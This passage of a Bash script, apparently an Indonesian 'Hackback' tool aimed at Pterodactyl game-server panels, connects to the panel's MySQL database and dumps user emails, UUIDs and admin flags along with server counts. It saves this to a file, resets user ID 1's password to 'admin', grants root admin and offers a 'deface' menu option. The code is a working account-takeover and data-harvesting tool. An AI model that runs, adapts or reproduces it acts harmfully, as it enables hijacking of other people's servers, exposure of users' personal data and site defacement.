    echo -e "${GREEN}OS:${NC} $(cat /etc/os-release 2>/dev/null | grep PRETTY_NAME | cut -d'"' -f2)"
    echo -e "${GREEN}Kernel:${NC} $(uname -r)"
    echo -e "${GREEN}Uptime:${NC} $(uptime -p)"
    
    # ==========================================
    # URL PANEL (APP URL)
    # ==========================================
    echo -e "\n${CYAN}${GLOBE} URL PANEL${NC}"
    echo -e "${WHITE}‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ${NC}"
    
    if [ -n "$APP_URL" ]; then
        URL_PANEL="$APP_URL"
    else
        # Coba deteksi dari Nginx
        if [ -f "/etc/nginx/sites-enabled/pterodactyl.conf" ]; then
            URL_PANEL=$(grep server_name /etc/nginx/sites-enabled/pterodactyl.conf | head -1 | awk '{print $2}' | tr -d ';')
            URL_PANEL="http://$URL_PANEL"
        elif [ -f "/etc/apache2/sites-enabled/pterodactyl.conf" ]; then
            URL_PANEL=$(grep ServerName /etc/apache2/sites-enabled/pterodactyl.conf | head -1 | awk '{print $2}')
            URL_PANEL="http://$URL_PANEL"
        else
            URL_PANEL="http://$IP"
        fi
    fi
    
    echo -e "${GREEN}URL Panel:${NC} ${YELLOW}$URL_PANEL${NC}"
    
    # ==========================================
    # INFO DATABASE
    # ==========================================
    echo -e "\n${BLUE}${DATABASE} Informasi Database${NC}"
    echo -e "${WHITE}‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ${NC}"
    
    if [ -n "$DB_HOST" ]; then
        echo -e "${GREEN}Database Host:${NC} $DB_HOST"
        echo -e "${GREEN}Database Port:${NC} $DB_PORT"
        echo -e "${GREEN}Database Name:${NC} $DB_NAME"
        echo -e "${GREEN}Database User:${NC} $DB_USER"
        echo -e "${GREEN}Database Pass:${NC} ${RED}[HIDDEN]${NC}"
    else
        echo -e "${RED}Tidak ada info database${NC}"
    fi
    
    # ==========================================
    # CONNECT KE DATABASE UNTUK GET INFO USER
    # ==========================================
    if [ -n "$DB_HOST" ] && [ -n "$DB_USER" ] && [ -n "$DB_PASS" ] && [ -n "$DB_NAME" ]; then
        
        # Cek koneksi MySQL
        if mysql -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USER" -p"$DB_PASS" -e "USE $DB_NAME" 2>/dev/null; then
            
            # ==========================================
            # AUTO GET ID 1
            # ==========================================
            echo -e "\n${GREEN}${ID} AUTO GET USER ID 1${NC}"
            echo -e "${WHITE}‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ${NC}"
            
            # Query user ID 1
            USER1_QUERY="SELECT id, uuid, username, email, name_first, name_last, language, root_admin, created_at FROM users WHERE id = 1"
            USER1_RESULT=$(mysql -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USER" -p"$DB_PASS" -D "$DB_NAME" -e "$USER1_QUERY" 2>/dev/null | tail -n +2)
            
            if [ -n "$USER1_RESULT" ]; then
                ID1=$(echo "$USER1_RESULT" | awk '{print $1}')
                UUID1=$(echo "$USER1_RESULT" | awk '{print $2}')
                USERNAME1=$(echo "$USER1_RESULT" | awk '{print $3}')
                EMAIL1=$(echo "$USER1_RESULT" | awk '{print $4}')
                FIRST1=$(echo "$USER1_RESULT" | awk '{print $5}')
                LAST1=$(echo "$USER1_RESULT" | awk '{print $6}')
                LANG1=$(echo "$USER1_RESULT" | awk '{print $7}')
                ADMIN1=$(echo "$USER1_RESULT" | awk '{print $8}')
                CREATED1=$(echo "$USER1_RESULT" | awk '{print $9}')
                
                echo -e "${GREEN}${CHECK} USER ID 1 DITEMUKAN!${NC}\n"
                echo -e "${WHITE}‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïó${NC}"
                echo -e "${WHITE}‚ïë              DETAIL USER ID 1                      ‚ïë${NC}"
                echo -e "${WHITE}‚ï†‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ï£${NC}"
                echo -e "${WHITE}‚ïë${NC}"
                echo -e "${WHITE}‚ïë  ${CYAN}${ID} ID          :${NC} ${GREEN}$ID1${NC}"
                echo -e "${WHITE}‚ïë  ${CYAN}${KEY} UUID        :${NC} $UUID1"
                echo -e "${WHITE}‚ïë  ${CYAN}${USER} Username    :${NC} ${YELLOW}$USERNAME1${NC}"
                echo -e "${WHITE}‚ïë  ${CYAN}${EMAIL} Email       :${NC} $EMAIL1"
                echo -e "${WHITE}‚ïë  ${CYAN}${FILE} Nama Depan  :${NC} $FIRST1"
                echo -e "${WHITE}‚ïë  ${CYAN}${FILE} Nama Belakang:${NC} $LAST1"
                echo -e "${WHITE}‚ïë  ${CYAN}${GLOBE} Language    :${NC} $LANG1"
                echo -e "${WHITE}‚ïë  ${CYAN}${CROWN} Root Admin  :${NC} $([ "$ADMIN1" == "1" ] && echo "${GREEN}Yes${NC}" || echo "${RED}No${NC}")"
                echo -e "${WHITE}‚ïë  ${CYAN}${CALENDAR} Created At  :${NC} $CREATED1"
                echo -e "${WHITE}‚ïë${NC}"
                echo -e "${WHITE}‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù${NC}"
                
                # Set variables untuk info panel
                USERNAME_PANEL="$USERNAME1"
                USER_ID_PANEL="$ID1"
                
            else
                echo -e "${RED}${CROSS} User ID 1 tidak ditemukan!${NC}"
            fi
            
            # ==========================================
            # GET INFO USER LAINNYA
            # ==========================================
            echo -e "\n${CYAN}${USER} INFORMASI USER PANEL${NC}"
            echo -e "${WHITE}‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ${NC}"
            
            # Total Users
            TOTAL_USERS=$(mysql -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USER" -p"$DB_PASS" -D "$DB_NAME" -e "SELECT COUNT(*) FROM users" 2>/dev/null | tail -n +2)
            TOTAL_ADMIN=$(mysql -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USER" -p"$DB_PASS" -D "$DB_NAME" -e "SELECT COUNT(*) FROM users WHERE root_admin = 1" 2>/dev/null | tail -n +2)
            
            echo -e "${GREEN}Total Users:${NC} $TOTAL_USERS"
            echo -e "${GREEN}Total Admin:${NC} $TOTAL_ADMIN"
            
            # 5 User Teratas
            echo -e "\n${YELLOW}5 User Teratas (by ID):${NC}"
            mysql -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USER" -p"$DB_PASS" -D "$DB_NAME" -e "SELECT id, username, email, root_admin FROM users ORDER BY id LIMIT 5" 2>/dev/null | column -t
            
            # ==========================================
            # INFO SERVER
            # ==========================================
            echo -e "\n${PURPLE}${SERVER} INFORMASI SERVER PANEL${NC}"
            echo -e "${WHITE}‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ${NC}"
            
            TOTAL_SERVERS=$(mysql -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USER" -p"$DB_PASS" -D "$DB_NAME" -e "SELECT COUNT(*) FROM servers" 2>/dev/null | tail -n +2)
            TOTAL_NODES=$(mysql -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USER" -p"$DB_PASS" -D "$DB_NAME" -e "SELECT COUNT(*) FROM nodes" 2>/dev/null | tail -n +2)
            TOTAL_ALLOCATIONS=$(mysql -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USER" -p"$DB_PASS" -D "$DB_NAME" -e "SELECT COUNT(*) FROM allocations" 2>/dev/null | tail -n +2)
            TOTAL_EGGS=$(mysql -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USER" -p"$DB_PASS" -D "$DB_NAME" -e "SELECT COUNT(*) FROM eggs" 2>/dev/null | tail -n +2)
            
            echo -e "${GREEN}Total Servers:${NC} $TOTAL_SERVERS"
            echo -e "${GREEN}Total Nodes:${NC} $TOTAL_NODES"
            echo -e "${GREEN}Total Allocations:${NC} $TOTAL_ALLOCATIONS"
            echo -e "${GREEN}Total Eggs:${NC} $TOTAL_EGGS"
            
        else
            echo -e "\n${RED}${CROSS} Tidak bisa terhubung ke database!${NC}"
        fi
    fi
    
    # ==========================================
    # RINGKASAN INFO PANEL
    # ==========================================
    echo -e "\n${GREEN}‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïó${NC}"
    echo -e "${GREEN}‚ïë              RINGKASAN INFORMASI PANEL                         ‚ïë${NC}"
    echo -e "${GREEN}‚ï†‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ï£${NC}"
    echo -e "${GREEN}‚ïë${NC}                                                                ${GREEN}‚ïë${NC}"
    echo -e "${GREEN}‚ïë${NC}  ${GLOBE} URL PANEL      : ${YELLOW}$URL_PANEL${NC}                         ${GREEN}‚ïë${NC}"
    echo -e "${GREEN}‚ïë${NC}  ${USER} USERNAME PANEL : ${CYAN}$USERNAME_PANEL${NC}                           ${GREEN}‚ïë${NC}"
    echo -e "${GREEN}‚ïë${NC}  ${ID} USER ID        : ${GREEN}$USER_ID_PANEL${NC}                               ${GREEN}‚ïë${NC}"
    echo -e "${GREEN}‚ïë${NC}  ${CROWN} STATUS ADMIN   : ${GREEN}YES (ID 1)${NC}                             ${GREEN}‚ïë${NC}"
    echo -e "${GREEN}‚ïë${NC}  ${PASSWORD} DEFAULT PASS  : ${YELLOW}admin${NC} (sudah direset)                 ${GREEN}‚ïë${NC}"
    echo -e "${GREEN}‚ïë${NC}                                                                ${GREEN}‚ïë${NC}"
    echo -e "${GREEN}‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù${NC}"
    
    # ==========================================
    # SAVE INFO TO FILE
    # ==========================================
    INFO_FILE="panel_info_$(date +%Y%m%d_%H%M%S).txt"
    
    cat > "$INFO_FILE" << EOF
====================================
HACKBACK PTERODACTYL - INFO PANEL
====================================
Tanggal: $(date)
====================================

[URL PANEL]
$URL_PANEL

[USER PANEL]
Username: $USERNAME_PANEL
User ID: $USER_ID_PANEL
Password: admin (sudah direset)
Status: Admin

[DATABASE]
Host: $DB_HOST
Port: $DB_PORT
Name: $DB_NAME
User: $DB_USER
Password: [HIDDEN]

[SERVER STATS]
Total Users: $TOTAL_USERS
Total Admin: $TOTAL_ADMIN
Total Servers: $TOTAL_SERVERS
Total Nodes: $TOTAL_NODES

====================================
EOF
    
    echo -e "\n${GREEN}${CHECK} Informasi disimpan ke: ${YELLOW}$INFO_FILE${NC}"
}

# ==============================================
# FUNGSI RESET PASSWORD ID 1
# ==============================================
reset_password_id1() {
    echo -e "\n${YELLOW}${PASSWORD} MERESET PASSWORD USER ID 1...${NC}"
    
    NEW_PASSWORD="admin"
    
    if [ -n "$DB_HOST" ] && [ -n "$DB_USER" ] && [ -n "$DB_PASS" ] && [ -n "$DB_NAME" ]; then
        
        # Cek apakah user ID 1 ada
        CHECK_USER=$(mysql -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USER" -p"$DB_PASS" -D "$DB_NAME" -e "SELECT id FROM users WHERE id = 1" 2>/dev/null | tail -n +2)
        
        if [ -n "$CHECK_USER" ]; then
            # Generate password hash menggunakan bcrypt (format Laravel)
            # Alternatif: menggunakan php artisan atau langsung bcrypt
            
            # Method 1: Menggunakan PHP (jika tersedia)
            if command -v php >/dev/null 2>&1; then
                PASSWORD_HASH=$(php -r "echo password_hash('$NEW_PASSWORD', PASSWORD_BCRYPT);" 2>/dev/null)
            else
                # Fallback: generate hash sederhana (tidak direkomendasikan untuk production)
                # Tapi untuk Pterodactyl, harus pakai bcrypt
                echo -e "${RED}${CROSS} PHP tidak ditemukan! Tidak bisa generate bcrypt hash.${NC}"
                echo -e "${YELLOW}Mencoba method alternatif...${NC}"
                
                # Coba deteksi apakah ada artisan
                if [ -f "$PTERO_DIR/artisan" ]; then
                    cd "$PTERO_DIR"
                    PASSWORD_HASH=$(php artisan tinker --execute="echo bcrypt('$NEW_PASSWORD');" 2>/dev/null | grep -o '\$2y\$.*' | head -1)
                else
                    echo -e "${RED}Gagal mereset password. Pastikan PHP terinstall.${NC}"
                    return 1
                fi
            fi
            
            if [ -n "$PASSWORD_HASH" ]; then
                # Update password di database
                mysql -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USER" -p"$DB_PASS" -D "$DB_NAME" -e "UPDATE users SET password = '$PASSWORD_HASH' WHERE id = 1" 2>/dev/null
                
                if [ $? -eq 0 ]; then
                    echo -e "${GREEN}${CHECK} PASSWORD USER ID 1 BERHASIL DI RESET!${NC}"
                    echo -e "${GREEN}${PASSWORD} Password baru: ${YELLOW}admin${NC}"
                    
                    # Update juga root_admin jadi 1
                    mysql -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USER" -p"$DB_PASS" -D "$DB_NAME" -e "UPDATE users SET root_admin = 1 WHERE id = 1" 2>/dev/null
                    echo -e "${GREEN}${CROWN} User ID 1 sekarang adalah SUPER ADMIN!${NC}"
                    
                    # Tampilkan info login
                    echo -e "\n${WHITE}‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïó${NC}"
                    echo -e "${WHITE}‚ïë              INFO LOGIN PANEL                       ‚ïë${NC}"
                    echo -e "${WHITE}‚ï†‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ï£${NC}"
                    echo -e "${WHITE}‚ïë${NC}"
                    echo -e "${WHITE}‚ïë  ${GLOBE} URL    : ${CYAN}$URL_PANEL${NC}"
                    echo -e "${WHITE}‚ïë  ${USER} Username: ${GREEN}$USERNAME1${NC}"
                    echo -e "${WHITE}‚ïë  ${PASSWORD} Password: ${YELLOW}admin${NC}"
                    echo -e "${WHITE}‚ïë${NC}"
                    echo -e "${WHITE}‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù${NC}"
                else
                    echo -e "${RED}${CROSS} Gagal update password!${NC}"
                fi
            else
                echo -e "${RED}${CROSS} Gagal generate hash password!${NC}"
            fi
        else
            echo -e "${RED}${CROSS} User ID 1 tidak ditemukan dalam database!${NC}"
        fi
    else
        echo -e "${RED}${CROSS} Informasi database tidak lengkap!${NC}"
    fi
}

# ==============================================
# MAIN MENU
# ==============================================
show_menu() {
    echo ""
    echo -e "${WHITE}‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïó${NC}"
    echo -e "${WHITE}‚ïë                         PILIHAN MENU                                        ‚ïë${NC}"
    echo -e "${WHITE}‚ï†‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ï£${NC}"
    echo -e "${WHITE}‚ïë                                                                            ‚ïë${NC}"
    echo -e "${WHITE}‚ïë  ${GREEN}[1]${NC} ${GLOBE} GET INFO PANEL LENGKAP + AUTO ID 1                    ${WHITE}‚ïë${NC}"
    echo -e "${WHITE}‚ïë  ${CYAN}[2]${NC} ${USER} GET USER INFO (MANUAL)                                 ${WHITE}‚ïë${NC}"
    echo -e "${WHITE}‚ïë  ${PURPLE}[3]${NC} ${SERVER} GET SERVER INFO                                     ${WHITE}‚ïë${NC}"
    echo -e "${WHITE}‚ïë  ${YELLOW}[4]${NC} ${DATABASE} GET DATABASE INFO                                 ${WHITE}‚ïë${NC}"
    echo -e "${WHITE}‚ïë  ${BLUE}[5]${NC} ${FILE} SAVE INFO TO FILE                                      ${WHITE}‚ïë${NC}"
    echo -e "${WHITE}‚ïë  ${RED}[6]${NC} ${CROWN} MAKE ID 1 SUPER ADMIN                                  ${WHITE}‚ïë${NC}"
    echo -e "${WHITE}‚ïë  ${PURPLE}[7]${NC} ${PASSWORD} RESET PASSWORD ID 1 (NEW: admin)                 ${WHITE}‚ïë${NC}"
    echo -e "${WHITE}‚ïë  ${GREEN}[8]${NC} ${FIRE} AUTO GET ID 1 + RESET PASSWORD (ALL IN ONE)           ${WHITE}‚ïë${NC}"
    echo -e "${WHITE}‚ïë  ${RED}[9]${NC} ${SKULL} DEFACE PTERODACTYL (HENGKER STYLE)                     ${WHITE}‚ïë${NC}"
    echo -e "${WHITE}‚ïë  ${YELLOW}[10]${NC} ${GEAR} RESTORE DEFACE (KEMBALIKAN NORMAL)                    ${WHITE}‚ïë${NC}"
    echo -e "${WHITE}‚ïë  ${RED}[0]${NC} üö™ KELUAR                                                     ${WHITE}‚ïë${NC}"
    echo -e "${WHITE}‚ïë                                                                            ‚ïë${NC}"
    echo -e "${WHITE}‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù${NC}"
    echo ""
    echo -ne "${YELLOW}‚û§ Pilih menu [0-10]: ${NC}"
}

# Function: Get user info manual
get_user_manual() {
    echo -ne "${CYAN}Masukkan ID User: ${NC}"
    read user_id
    
    if [ -n "$DB_HOST" ] && [ -n "$DB_USER" ] && [ -n "$DB_PASS" ] && [ -n "$DB_NAME" ]; then
        mysql -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USER" -p"$DB_PASS" -D "$DB_NAME" -e "SELECT id, uuid, username, email, name_first, name_last, root_admin, created_at FROM users WHERE id = $user_id" 2>/dev/null | column -t
    else
        echo -e "${RED}${CROSS} Tidak bisa konek database!${NC}"
    fi
}

# Function: Get server info
get_server_info() {
    if [ -n "$DB_HOST" ] && [ -n "$DB_USER" ] && [ -n "$DB_PASS" ] && [ -n "$DB_NAME" ]; then
        echo -e "\n${CYAN}Informasi Server:${NC}"
        mysql -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USER" -p"$DB_PASS" -D "$DB_NAME" -e "SELECT id, name, node_id, owner_id, egg_id, memory, cpu, disk FROM servers LIMIT 10" 2>/dev/null | column -t
    else
        echo -e "${RED}${CROSS} Tidak bisa konek database!${NC}"
    fi
}

# Function: Get database info
get_database_info() {
    if [ -n "$DB_HOST" ] && [ -n "$DB_USER" ] && [ -n "$DB_PASS" ] && [ -n "$DB_NAME" ]; then
        echo -e "\n${CYAN}Informasi Database:${NC}"
        echo -e "Host: $DB_HOST"
        echo -e "Port: $DB_PORT"
        echo -e "Database: $DB_NAME"
        echo -e "User: $DB_USER"
        
        # Show tables
        echo -e "\n${YELLOW}Daftar Tabel:${NC}"
        mysql -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USER" -p"$DB_PASS" -D "$DB_NAME" -e "SHOW TABLES" 2>/dev/null | column -t
    else
        echo -e "${RED}${CROSS} Tidak bisa konek database!${NC}"
    fi
}

# Function: Save info to file
save_info_file() {
    get_panel_info > /dev/null 2>&1
    # File sudah dibuat di function get_panel_info
}

# Function: Make ID 1 super admin
make_id1_admin() {
    if [ -n "$DB_HOST" ] && [ -n "$DB_USER" ] && [ -n "$DB_PASS" ] && [ -n "$DB_NAME" ]; then
        mysql -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USER" -p"$DB_PASS" -D "$DB_NAME" -e "UPDATE users SET root_admin = 1 WHERE id = 1" 2>/dev/null
        echo -e "${GREEN}${CHECK} ID 1 telah dijadikan SUPER ADMIN!${NC}"
    else
        echo -e "${RED}${CROSS} Tidak bisa konek database!${NC}"
    fi
}

# Function: Auto get ID 1 and reset password
auto_get_and_reset() {
    echo -e "\n${GREEN}${FIRE} AUTO GET ID 1 + RESET PASSWORD ${FIRE}${NC}"
    echo -e "${WHITE}‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ${NC}"
    
    # Panggil fungsi reset password
    reset_password_id1
}

# Main function
main() {
    # Tampilkan animasi welcome dulu
    show_welcome
    
    show_header
    
    # Auto get info panel saat startup
    get_panel_info
    
    # Menu loop
    while true; do
        show_menu
        read choice
        
        case $choice in
            1)
                get_panel_info
                ;;
            2)
                get_user_manual
                ;;
            3)
                get_server_info
                ;;
            4)
                get_database_info
                ;;
            5)
                save_info_file
                ;;
            6)
                make_id1_admin
                ;;
            7)
                reset_password_id1
                ;;
            8)
                auto_get_and_reset
                ;;
            9)
                deface_pterodactyl
                ;;
            10)
                restore_deface
                ;;
            0)
                echo -e "\n${GREEN}Thanks for using Hackback Info Edition!${NC}"
                echo -e "${CYAN}Telegram: @lynnn046${NC}"
                echo -e "${RED}Subscribe channel Rendzz Official!${NC}\n"
                exit 0
                ;;
            *)
                echo -e "${RED}Pilihan tidak valid!${NC}"
                ;;
        esac
        
        echo ""
        echo -ne "${CYAN}Tekan Enter untuk melanjutkan...${NC}"
        read
        clear
        show_header
        get_panel_info > /dev/null 2>&1  # Auto refresh info di background
    done
}

# Run main
main
